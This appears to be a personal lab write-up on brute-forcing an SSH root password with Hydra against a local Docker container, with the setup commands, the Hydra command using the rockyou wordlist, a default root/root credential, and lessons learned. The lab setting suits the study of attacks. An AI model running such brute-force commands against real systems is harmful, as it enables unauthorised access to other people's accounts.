*OOBJECTIVE*
Perform an SSH brute-force attack using Hydra against an isolated Docker container.

*ENVIRONMENT*
-Attacker: Kali Linux (host)
-Target: Docker container running `rastasheep/ubuntu-sshd`
-Target SSH Port: 2222 → 22 (container)
-Wordlist: rockyou.txt

1.) Deploy the Target
-sudo docker pull rastasheep/ubuntu-sshd
-sudo docker run -d --name ssh-lab -p 2222:22 rastasheep/ubuntu-sshd
-sudo docker ps

Target should show:
-0.0.0.0:2222->22/tcp



2.) Verify SSH Access
-ssh root@127.0.0.1 -p 2222
-Default password: root
-Then: exit

    -This confirms the service is ready and reachable.



3.) Run Hydra Attack
  -hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2222



*ISSUES ENCOUNTERED*
>Hydra Run Time
    -Hydra initially appeared slow due to SSH rate-limiting and thread load.


*EARLIER ATTEMPTS* (Before Docker)
VM networking failures
    -A VM was deployed using a Ubuntu ISO, I kept runnning into complications such as; missing SSH service, "connections refused" errors and package repository unereachables. Switching to Docker eliminated all issues.



5.) Key Learnings

* Docker provides clean, predictable targets for attack labs.
* Hydra performance depends on SSH rate limits, not just CPU power. (further investigation for futre labs)
* Always validate target connectivity before brute-forcing. (Note to self)
* Using Docker prevents risk to host SSH configuration.


*OUTCOME*

Successfully brute-forced the SSH root password through Hydra using a contained, reproducible target environment.
